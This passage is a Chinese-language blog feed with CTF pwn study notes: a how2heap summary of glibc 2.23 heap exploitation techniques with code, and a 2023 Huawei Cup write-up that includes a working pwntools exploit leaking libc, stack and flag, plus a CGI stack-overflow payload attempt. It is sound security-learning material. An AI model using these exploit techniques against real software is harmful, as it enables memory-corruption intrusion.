<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anza | 学习记录</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-09-27T15:36:46.298Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Anza</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>how2heap</title>
    <link href="http://example.com/2023/09/24/how2heap/"/>
    <id>http://example.com/2023/09/24/how2heap/</id>
    <published>2023-09-24T08:54:35.000Z</published>
    <updated>2023-09-27T15:36:46.298Z</updated>
    
    <content type="html"><![CDATA[<p>跟着 how2heap 学习一下各个版本堆的利用手法，又回到最初的起点，随缘慢慢更新~</p><span id="more"></span><h1 id="基础工作"><a href="#基础工作" class="headerlink" title="基础工作"></a>基础工作</h1><p>参考<a href="https://github.com/shellphish/how2heap">how2heap</a>。</p><p>gcc 加入调试信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o fastbin_dup_into_stack fastbin_dup_into_stack.c</span><br></pre></td></tr></table></figure><p>gdb 源码调试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l #显示源码</span><br><span class="line">b 9 #在第9行下断点</span><br></pre></td></tr></table></figure><p>注意需要使用对应 glibc 版本的 gcc 进行编译。</p><h1 id="Glibc2-23"><a href="#Glibc2-23" class="headerlink" title="Glibc2.23"></a>Glibc2.23</h1><h2 id="fastbin-dup-常用"><a href="#fastbin-dup-常用" class="headerlink" title="fastbin_dup(常用)"></a>fastbin_dup(常用)</h2><p>UAF 漏洞，需要绕过 double free 检测，利用手法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>导致 a 和 c 指向同一处。</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>UAF 漏洞，申请小堆块 p1 并释放后，若此时再申请到一个大堆块 p3，则触发<code>malloc_consolidate</code>，p1 被并入 top chunk，而后再分配堆块给 p3，关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">assert(p1 == p3);</span><br></pre></td></tr></table></figure><p>导致 p1 和 p3 指向同一处。</p><p>此时便可以利用 p1 释放 p3，再申请一个大堆块将和 p3 指向同一处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">assert(p4 == p3);</span><br></pre></td></tr></table></figure><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>UAF 漏洞，承接 fastbin_dup。假设我们泄露出一个栈地址，我们便可以利用 double free 申请到这片栈空间，关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"><span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));<span class="comment">//修改fd为栈指针</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));<span class="comment">//此时申请到栈空间</span></span><br></pre></td></tr></table></figure><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p>也是建立在 UAF 上，可以用来在某处写一个最大值，例如写 global_max_fast。</p><p>关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br></pre></td></tr></table></figure><p>我们需要修改 unsorted bin 中 p 的 BK 指针，使其指向 [目标地址-0x16] 处，可以使目标地址改为一个极大的值 (即 main_arena+88) 。</p><h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h2><p>建立在堆溢出上，并且能拿到栈地址，即可以通过上一个堆块修改下一个堆块的 size 位。</p><p>关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//防止合并</span></span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;<span class="comment">//在栈上伪造unsorted bin，修改其BK指向任何可写的地方</span></span><br><span class="line"></span><br><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;<span class="comment">//size要不同以通过check： 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem</span></span><br><span class="line">victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer;<span class="comment">//通过溢出之类的手法修改第一个堆块的size以及其BK</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//这一次分配会拿到栈上的空间</span></span><br><span class="line"><span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot;</span><br><span class="line"><span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><h2 id="unsafe-unlink-常用"><a href="#unsafe-unlink-常用" class="headerlink" title="unsafe_unlink(常用)"></a>unsafe_unlink(常用)</h2><p>需要 off-by-null，并要学会空间复用来修改下一个堆块的 prev_size。</p><p>关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;<span class="comment">//全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);<span class="comment">//chunk0_ptr全局变量为我们要攻击的地址</span></span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<span class="comment">//伪造chunk1的header，修改其presize和使用位</span></span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>此时 chunk 内数据如下：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309242116182.png" alt="image-20230924211651997" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309242126099.png" alt="image-20230924212600974" style="zoom:50%;" /><p>释放完成 unlink，此时全局变量 victim 就被修改成了指向自己那块空间的指针：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(chunk1_ptr);</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309242127097.png" alt="image-20230924212729963" style="zoom:50%;" /><p>注意一般 victim 所在指针具有写的功能，所以可以通过修改它自己以修改其他位置。</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>同样用来写入一个大值，关键代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;<span class="comment">//我们的修改目标</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1);<span class="comment">//p1和p2链入unsortedbin</span></span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);<span class="comment">//p2进入largebin,p1仍在largebin中，被切割</span></span><br><span class="line"><span class="built_in">free</span>(p3);<span class="comment">//p3链入unsortedbin</span></span><br><span class="line"></span><br><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;<span class="comment">//改小size位</span></span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);<span class="comment">//修改bk和bk_nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);<span class="comment">//再申请一个，</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着 how2heap 学习一下各个版本堆的利用手法，又回到最初的起点，随缘慢慢更新~&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>wp</title>
    <link href="http://example.com/2023/09/04/wp/"/>
    <id>http://example.com/2023/09/04/wp/</id>
    <published>2023-09-04T12:14:08.000Z</published>
    <updated>2023-09-28T11:02:51.424Z</updated>
    
    <content type="html"><![CDATA[<p>复盘、记录近期一些比赛的 wp。</p><span id="more"></span><h1 id="2023华为杯"><a href="#2023华为杯" class="headerlink" title="2023华为杯"></a>2023华为杯</h1><p>被打爆了，开局连不上网，原来是和 vpn 冲突了，然后登不上账号，结果密码中的<code>I</code>是<code>L</code>。</p><p>签到 pwn 想了会有思路了，打了半个多小时出了。然后看了另一道利用 gadget 编写返回地址的 asm pwn，不知道怎么构造 rdi 使其指向 /bin/sh，遂罢。还有一道 web cgi，很明显的栈溢出漏洞，但不知道是不是编码问题，一直读不进去0xe0 不可见字符，明明感觉离答案很近了，寄。c++ 的 300 分大题就没看😭。</p><h2 id="1-easy-ssp"><a href="#1-easy-ssp" class="headerlink" title="1. easy_ssp"></a>1. easy_ssp</h2><p>查了下 ssp，发现就是 stack_smashing 泄露，再看了一眼 libc，是2.23 （这个环境未修复 ssp）。</p><p>程序如下：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272039186.png" alt="image-20230927203942942" style="zoom:50%;" /><p>三次栈溢出：第一次覆盖用户变量为 got 表，泄露出 libc，第二次覆盖用户变量为 environ，泄露出 stack，第三次覆盖用户变量为 stack 上的 flag，泄露出加密后的 flag，解密即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;172.10.0.4&quot;</span>, <span class="number">10085</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b (gets)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What do you want to do?&quot;</span>, p64(puts_got)*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;environ==&gt;&quot;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;What do you want to do?&quot;</span>, p64(environ)*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line"></span><br><span class="line">stack = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;stack==&gt;&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your random id is: &quot;</span>)</span><br><span class="line">key = <span class="built_in">int</span>(io.recv(<span class="number">2</span>), <span class="number">10</span>)</span><br><span class="line">log.success(<span class="string">&quot;key==&gt;&quot;</span>+<span class="built_in">str</span>(key))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;What do you want to do?&quot;</span>, p64(stack-<span class="number">376</span>)*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line"></span><br><span class="line">enc = io.recvuntil(<span class="string">&quot;terminated&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag = flag + <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i])^key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-master-of-asm"><a href="#2-master-of-asm" class="headerlink" title="2. master-of-asm"></a>2. master-of-asm</h2><p>题目看起来蛮简单的，就是不会做。关键是不知道如何构造 rdi 指向 /bin/sh，也没跟 rdi 相关的 gadget啊：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272110220.png" alt="image-20230927211056177" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272111614.png" alt="image-20230927211126505" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272111539.png" alt="image-20230927211146444" style="zoom:50%;" /><p>猜想会不会是执行其他系统调用，等 wp。</p><h2 id="3-APACHE-CGI-PWN"><a href="#3-APACHE-CGI-PWN" class="headerlink" title="3. APACHE-CGI-PWN"></a>3. APACHE-CGI-PWN</h2><h3 id="复现环境搭建"><a href="#复现环境搭建" class="headerlink" title="复现环境搭建"></a>复现环境搭建</h3><p>搭建环境是 windows 下的 docker-desktop。</p><p>目录下准备了 Dockerfile：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272155494.png" alt="image-20230927215529410" style="zoom:50%;" /><p>打开该目录终端，输入如下命令，等待镜像拉去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t cgipwn:v1 .</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272156551.png" alt="image-20230927215650152" style="zoom:33%;" /><p>然后运行镜像，需要映射端口，这个可以在 docker-compose.yml 中找到：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272159875.png" alt="image-20230927215900849" style="zoom: 50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272158116.png" alt="image-20230927215824066" style="zoom:50%;" /><p>搭建完成。</p><p>比赛时十分意难平的一道题。题目录下有两个 .cgi 文件：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272120407.png" alt="image-20230927212047227" style="zoom:50%;" /><p>打开 check-ok.cgi，发现一个地方是栈溢出，并且该程序还给了后门，我当场就是窃喜：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272120364.png" alt="image-20230927212021297" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272127924.png" alt="image-20230927212721896" style="zoom:50%;" /><p>但要进入漏洞函数就需要生成 ./invitedCODE.txt，但要如何获取到 ./invitedCODE.txt 呢？我们打开网页看一下：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272131428.png" alt="image-20230927213144202" style="zoom:50%;" /><p>猜测就是下面的邀请码（invitedCODE）了，我们点进去，发现服务器返回 500，访问的正是另一个 getcookie.cgi：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272132101.png" alt="image-20230927213243828" style="zoom:50%;" /><p>我们看一下 getcookie.cgi 的程序逻辑，其实就是获取环境变量中的 HTTP_COOKIE，COOKIE 正确后就会生成邀请码：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272134644.png" alt="image-20230927213428450" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272134826.png" alt="image-20230927213459631" style="zoom:50%;" /><p>在此之前，有一些需要了解的 cgi 相关的 get_env 参数：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272137465.png" alt="image-20230927213721399" style="zoom:50%;" /><p>其中 HTTP_COOKIE 就是我们需要添入 COOKIE 的内容：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272136278.png" alt="image-20230927213602220" style="zoom:50%;" /><p>我们在本地 COOKIE 中加入它，并再次访问后，发现并没有再返回 500 了，因此很有可能之前程序 500 是因为 getenv(“HTTP_COOKIE”); 未找到环境变量发生了错误 ：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272138500.png" alt="image-20230927213835245" style="zoom:50%;" /><p>但我们还需进一步构造 Cookie 才能生成邀请码，这里逆向了一会，拿到了邀请码：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272146829.png" alt="image-20230927214615741" style="zoom:50%;" /><p>是的，到这里我以为已经十分轻松了，我立马就是进入 check-ok.cgi，想着这下总算可以溢出了吧：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272148160.png" alt="image-20230927214851061" style="zoom:50%;" /><p>注意请求 check-ok.cgi 是 post 方法，自带 cmd=：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272241524.png" alt="image-20230927224117444" style="zoom:50%;" /><p>因此计算一下偏移为 228，然后脚本，启动！</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272239873.png" alt="image-20230927223940778" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd=aaaaaaaaaaaa.......</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: <span class="string">b&#x27;a&#x27;</span>*<span class="number">228</span> + p64(<span class="number">0x4032E0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为是docker内的脚本，要访问到主机可以通过host.docker.internal</span></span><br><span class="line">r = requests.post(<span class="string">&quot;http://host.docker.internal:12000/check-ok.cgi&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>结果是程序崩了，且目录下也没生成 flag：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272251067.png" alt="image-20230927225140018" style="zoom:50%;" /><p>一些赛中+赛后的思考：</p><p>起初我认为是编码的问题，因为当我输入 %20（+） 时，是可以当作一个字符读入的，而输入 %E0 则被当成三个字符来输入，这让我很困惑，因为 0x4032E0 中 \xe0 是不可见的，不知道该如何被解码成一个字符读入，而 0x40 和 0x32 是可以用可见字符表示的：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309281859838.png" alt="image-20230928185958661" style="zoom:50%;" /><p>但还有一个问题，尽管 fgets 会给末尾添上 \x00，但 main 的返回地址是 libc 上的 6 个字节，只覆盖 3+1 个字节无法使高位变成 \x00，本质上也是不可见字符问题。</p><p>于是开始翻博客，发现不可见字符在 URL 编码中是非法的😩：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309281847179.png" alt="image-20230928184744925" style="zoom: 33%;" /><p>头脑风暴一下，有没有可能是 Apache 中间件漏洞？或许可以目录穿越读 flag，毕竟根据错误页面可知 Apache 版本并不是最新版的，查了一下 CVE，但不知道是不是攻击方式不对，无果。 </p><p>等解答😭。</p><h1 id="2023羊城杯初赛"><a href="#2023羊城杯初赛" 